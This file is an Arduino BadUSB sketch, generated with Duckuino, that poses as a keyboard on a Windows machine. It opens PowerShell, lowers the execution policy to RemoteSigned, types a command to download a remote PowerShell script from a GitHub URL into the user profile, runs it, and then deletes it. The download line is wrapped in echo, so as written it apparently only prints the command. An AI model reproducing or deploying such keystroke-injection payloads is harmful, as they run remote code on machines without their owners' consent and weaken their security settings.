/**
 * Made with Duckuino, an open-source project.
 * Check the license at 'https://github.com/Dukweeno/Duckuino/blob/master/LICENSE'
 */


#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  // ChangeWallpaper
  delay(2000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(2000);
  Keyboard.print(F("powershell"));

  typeKey(KEY_RETURN);

  delay(5000);
  Keyboard.print(F("set-executionpolicy -Scope CurrentUser remotesigned"));

  typeKey(KEY_RETURN);

  delay(1000);
  Keyboard.print(F("y"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("echo \"wget -Uri https://raw.githubusercontent.com/MeditationDuck/badusb/main/changeWallpaper.ps1 -outfile $env:USERPROFILE\\c.ps1\""));

  typeKey(KEY_RETURN);

  Keyboard.print(F(".\\c.ps1"));

  delay(100000);
  Keyboard.print(F("rm $env:USERPROFILE\\c.ps1"));

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
